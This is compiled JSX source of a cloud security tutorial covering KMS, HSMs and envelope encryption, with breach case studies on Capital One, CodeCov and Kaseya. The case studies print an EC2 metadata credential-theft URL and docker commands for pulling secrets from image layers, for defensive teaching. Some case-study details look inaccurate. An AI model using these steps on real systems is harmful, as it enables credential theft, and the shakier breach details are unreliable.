    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "cloud-data-protection",
      children: "Cloud Data Protection"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "kms-key-management-service",
      children: "KMS (Key Management Service)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A master key cabinet in a hotel. Each room (data) has its own key. KMS is the front desk that securely manages all the keys. You ask the front desk to lock or unlock, but you never touch the master key itself."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "AWS KMS Key Types:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Key Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Scope"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Use Case"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Rotation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AWS Managed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Service-specific (aws/s3, aws/rds)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Default encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automatic (yearly)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Customer Managed (CMK)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Your own KMS keys"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full control, custom key policy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Optional (yearly)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Custom Key Store"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CloudHSM-backed keys"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Regulatory compliance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Manual"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AWS Owned"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Internal AWS keys"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SSE-S3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS-managed"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Create a customer managed KMS key\naws kms create-key --description \"Production encryption key\" --key-usage ENCRYPT_DECRYPT --origin AWS_KMS\naws kms create-alias --alias-name alias/prod-key --target-key-id $(aws kms list-keys --query 'Keys[0].KeyId' --output text)\n\n# Encrypt data with KMS\naws kms encrypt --key-id alias/prod-key --plaintext fileb://secret.txt --output text --query CiphertextBlob\n\n# Decrypt data\naws kms decrypt --ciphertext-blob fileb://secret.txt.encrypted --output text --query Plaintext | base64 --decode\n\n# Enable automatic key rotation\naws kms enable-key-rotation --key-id alias/prod-key\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "hsm-hardware-security-module",
      children: "HSM (Hardware Security Module)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " A bank vault within a bank vault. HSM is a tamper-resistant hardware appliance that stores keys. Even AWS employees cannot extract keys from an HSM. Used for FIPS 140-2 Level 3 compliance."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Cloud HSM Options:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Provider"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "HSM Service"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Certification"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Use Case"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AWS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CloudHSM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FIPS 140-2 Level 3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PKI, code signing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AWS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS KMS Custom Key Store (CloudHSM)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FIPS 140-2 Level 3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "KMS keys backed by HSM"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Azure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Azure Dedicated HSM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FIPS 140-2 Level 3, eIDAS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Payment processing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Azure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Azure Managed HSM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FIPS 140-2 Level 3, PCI-DSS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Key vault at scale"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "GCP"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud HSM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FIPS 140-2 Level 3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CMEK with HSM backing"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "envelope-encryption",
      children: "Envelope Encryption"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Concept:"
      }), " Encrypt data with a Data Encryption Key (DEK). Encrypt the DEK with a Key Encryption Key (KEK). Store the encrypted DEK alongside the data."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Analogy:"
      }), " Putting a letter in a lockbox (DEK encrypts the data). Then putting the lockbox key in a safe (KEK encrypts the DEK). You carry the safe key with you, not the lockbox key."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Data Flow:\nPlaintext -> Encrypt(Plaintext, DEK) -> Ciphertext\nDEK -> Encrypt(DEK, KEK) -> Encrypted DEK\nCiphertext + Encrypted DEK -> Stored together\n\nDecrypt Flow:\nEncrypted DEK -> Decrypt(Encrypted DEK, KEK) -> DEK\nCiphertext -> Decrypt(Ciphertext, DEK) -> Plaintext\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-javascript",
        children: "// AWS SDK - Envelope Encryption with KMS\nconst AWS = require('aws-sdk');\nconst kms = new AWS.KMS();\n\nasync function envelopeEncrypt(plaintext, keyId) {\n    // Step 1: Generate a data key (DEK)\n    const dataKey = await kms.generateDataKey({\n        KeyId: keyId,\n        KeySpec: 'AES_256'\n    }).promise();\n    // dataKey.Plaintext = DEK (plaintext - use, then discard)\n    // dataKey.CiphertextBlob = Encrypted DEK (store safely)\n\n    // Step 2: Encrypt data with DEK (AES-256-GCM)\n    const encryptedData = encryptAes256Gcm(plaintext, dataKey.Plaintext);\n\n    // Step 3: Return encrypted data + encrypted DEK\n    return {\n        encryptedData: encryptedData,\n        encryptedKey: dataKey.CiphertextBlob,\n        iv: encryptedData.iv,\n        tag: encryptedData.tag\n    };\n}\n\nasync function envelopeDecrypt(encryptedData, encryptedKey, iv, tag) {\n    // Step 1: Decrypt the DEK using KMS\n    const dataKey = await kms.decrypt({\n        CiphertextBlob: encryptedKey\n    }).promise();\n\n    // Step 2: Decrypt data with DEK\n    return decryptAes256Gcm(encryptedData, dataKey.Plaintext, iv, tag);\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity Analysis — Envelope Encryption:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Encryption setup:"
        }), " O(1) — one KMS API call + one AES operation"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Decryption setup:"
        }), " O(1) — one KMS API call + one AES operation"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Bulk data encryption:"
        }), " O(n) where n = data size"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "KEK rotation:"
        }), " O(1) — re-encrypt DEK with new KEK"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "ad-table--cloud-data-protection",
      children: "A&D Table — Cloud Data Protection"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Approach"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Advantages"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Disadvantages"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SSE-S3 (AES-256)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free, automatic"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "No key control"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SSE-KMS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Key rotation, audit, separation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cost per KMS API call"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SSE-C (Customer key)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full key control"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Must manage key lifecycle"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Client-side encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "End-to-end security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Key management complexity"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "HSM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Tamper-resistant, compliance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High cost, slower operations"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "edge-cases--cloud-data-protection",
      children: "Edge Cases — Cloud Data Protection"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "KMS key deletion:"
        }), " Keys have a 7-30 day waiting period. Once deleted, all data encrypted with that key is permanently inaccessible."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cross-region KMS:"
        }), " KMS keys are region-specific. To encrypt data in multiple regions, use multi-Region keys or re-encrypt with each region's key."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Key policy vs IAM policy:"
        }), " Key policies directly attach to KMS keys. IAM policies control which users can call KMS APIs. Both can grant access — the more permissive wins (unless explicit Deny)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Envelope encryption performance:"
        }), " For small payloads (<1KB), direct KMS encrypt is fine. For large files (>1MB), always use envelope encryption."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "case-study-1-capital-one-2019--aws-ssrf-breach",
      children: "Case Study 1: Capital One 2019 — AWS SSRF Breach"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Overview:"
      }), " A former AWS employee exploited a Server-Side Request Forgery (SSRF) vulnerability in Capital One's WAF configuration to steal data of over 100 million customers."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "attack-timeline",
      children: "Attack Timeline"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "What Happened"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Attack Technique"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Reconnaissance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attacker scanned Capital One's public-facing IPs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Port scanning"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WAF bypass"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attacker discovered ModSecurity WAF was configured to block SSRF attempts — but the WAF itself had a metadata endpoint that could be queried"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SSRF via WAF metadata"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Metadata exfiltration"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["Attacker queried the AWS EC2 metadata endpoint ", (0,jsx_runtime.jsx)(_components.code, {
              children: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            })]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "EC2 IMDSv1"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Role credentials stolen"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Retrieved the IAM role credentials for the WAF server role"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAM credential theft"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "S3 enumeration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Used compromised credentials to list S3 buckets and retrieve data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "S3 bucket enumeration"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Data extraction"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Downloaded 700+ S3 buckets containing customer application data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data exfiltration"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "root-cause-analysis",
      children: "Root Cause Analysis"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Root Cause"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Impact"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Fix Applied"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ModSecurity WAF vulnerable to SSRF"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WAF bypass"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WAF replaced with CloudFront + AWS WAF"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IMDSv1 enabled on EC2 instances"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Metadata accessible without token"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enforce IMDSv2 (requires session token)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Overly permissive IAM role for WAF server"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Read access to all S3 buckets"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Least privilege IAM, S3 bucket policies"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "No S3 bucket access logging"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Delayed detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enable S3 server access logs + CloudTrail"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "No SCP restricting resource access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Unlimited S3 enumeration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SCP to restrict actions to specific account"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "mitigation--ec2-imdsv2-hardening",
      children: "Mitigation — EC2 IMDSv2 Hardening"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Enforce IMDSv2 (requires token for metadata access)\naws ec2 modify-instance-metadata-options --instance-id i-12345 \\\n  --http-tokens required \\\n  --http-put-response-hop-limit 1 \\\n  --http-endpoint enabled\n\n# Block metadata access from containers/pods\naws ec2 modify-instance-metadata-options --instance-id i-12345 \\\n  --http-put-response-hop-limit 1\n\n# (hop-limit=1 means only the EC2 instance itself can access metadata)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "case-study-2-codecov-2021--container-misconfiguration",
      children: "Case Study 2: CodeCov 2021 — Container Misconfiguration"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Overview:"
      }), " Attackers exploited a misconfigured Docker image build process in CodeCov's CI/CD pipeline to gain access to environment variables containing credentials."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "attack-flow",
      children: "Attack Flow"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Attacker identified that CodeCov's Docker image build process leaked environment variables in the image layers."
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["The ", (0,jsx_runtime.jsx)(_components.code, {
          children: "docker save"
        }), " command preserved environment variable history in intermediate image layers."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Attacker pulled the public Docker image and inspected layers:\n", (0,jsx_runtime.jsx)(_components.pre, {
          children: (0,jsx_runtime.jsx)(_components.code, {
            className: "language-bash",
            children: "docker pull codecov/uploader:latest\ndocker history --no-trunc codecov/uploader:latest\n"
          })
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Extracted AWS credentials, GitHub tokens, and Slack webhooks from image layers."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Used stolen credentials to compromise CodeCov's GitHub repositories and inject malicious code."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "root-causes",
      children: "Root Causes"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Issue"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Fix"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Secrets passed as build args not cleaned"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["Use ", (0,jsx_runtime.jsx)(_components.code, {
              children: "--build-arg"
            }), " with multi-stage builds"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Docker image layers leaked history"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Squash layers, use multi-stage, never store secrets"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CI/CD credentials in plaintext env vars"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use ephemeral credentials (OIDC, STS)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Public Docker image"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Private registry with pull secrets"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "secure-docker-build-pipeline",
      children: "Secure Docker Build Pipeline"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-dockerfile",
        children: "# BAD: Secrets leak in layer history\nFROM node:18\nARG AWS_SECRET_ACCESS_KEY\nENV AWS_SECRET_ACCESS_KEY=${AWS_SECRET_ACCESS_KEY}\nRUN aws s3 cp s3://private-bucket/data.json /app/data.json\n\n# GOOD: Multi-stage, no secrets in final image\nFROM node:18 AS builder\nARG AWS_ACCESS_KEY_ID\nARG AWS_SECRET_ACCESS_KEY\nRUN aws s3 cp s3://private-bucket/data.json /app/data.json\n\nFROM node:18-slim\nCOPY --from=builder /app/data.json /app/data.json\n# Secret is only in the builder stage, not in the final image\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "case-study-3-kaseya-vsa-2021--revil-ransomware-via-vdisupply-chain",
      children: "Case Study 3: Kaseya VSA 2021 — REvil Ransomware via VDI/Supply Chain"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Overview:"
      }), " REvil ransomware gang exploited a zero-day in Kaseya VSA (Virtual System Administrator), a remote monitoring and management (RMM) tool used by MSPs. The attack propagated through Kaseya's cloud infrastructure to compromise 60 MSPs and 1,500+ downstream businesses."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "attack-timeline-1",
      children: "Attack Timeline"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detail"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Technique"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerability discovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Attackers found an authentication bypass in Kaseya VSA web interface"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CVE-2021-30116"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Initial access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bypassed authentication, gained admin access to VSA on-prem instance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Authentication bypass"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Privilege escalation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Escalated to VSA system admin, disabled logging"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Log tampering"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Malicious update"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pushed a fake software update through VSA's legitimate update mechanism"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Software supply chain"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Propagation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "VSA pushed REvil encryptor to all managed endpoints"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ransomware deployment"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Escalation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Decrypted REvil binary on 1,500+ businesses"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Supply chain ransomware"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "key-lessons",
      children: "Key Lessons"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Lesson"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Implementation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Supply chain risk"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Audit all third-party software update mechanisms"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "RMM tool security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Apply network segmentation, restrict RMM agent access"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Signed update verification"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Validate update signatures and hashes before applying"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Incident response for MSPs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Have playbooks for supply chain + ransomware combined"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "case-study-4-pegasus-nso-group--forcedentry",
      children: "Case Study 4: Pegasus (NSO Group) — FORCEDENTRY"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
